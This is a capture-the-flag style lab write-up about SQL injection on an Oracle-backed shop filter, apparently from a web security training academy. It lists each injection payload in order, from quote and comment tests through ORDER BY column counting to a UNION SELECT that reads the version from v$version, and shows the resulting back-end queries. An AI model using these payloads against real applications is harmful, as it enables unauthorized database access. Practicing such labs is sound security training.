# Lab: SQL injection attack, querying the database type and version on Oracle

- sqli: product category fillter
- end goal: display the database version string

### Analysis
- url: `https://0a3f004e032b939c80bb081500cb0036.web-security-academy.net/`

- front-end: `/filter?category=Gifts`
- back-end:
```sql
select * from product where category = 'Gifts' and released = 1
``` 

- check sqli vulnerability
- front-end: `/filter?category=Gifts'`
- back-end:
```sql
select * from product where category = 'Gifts'' and released = 1
'-- 500 Internal Server Error
``` 

- front-end: `/filter?category=Gifts'--`
- back-end:
```sql
select * from product where category = 'Gifts'--' and released = 1
-- 200 OK
```

- determine how many columns are contain in this website
- front-end: `/filter?category=Gifts' order by 2--`
- back-end:
```sql
select * from product where category = 'Gifts' order by 2--' and released = 1
-- found 2 columns
```

- determine type of data are contain in the columns
- front-end: `/filter?category=Gifts' union select 'a', 'a' from dual--`
- back-end:
```sql
select * from product where category = 'Gifts' union select 'a', 'a' from dual--' and released = 1
-- Oracle: 200 OK: both columns are text 
```

- display the database version 
- front-end: `/filter?category=Gifts' union select banner, null from v$version--`
- back-end:
```sql
select * from product where category = 'Gifts' union select banner, null from v$version--' and released = 1
-- 200 OK 
```
- Congratulations, you solved the lab!

---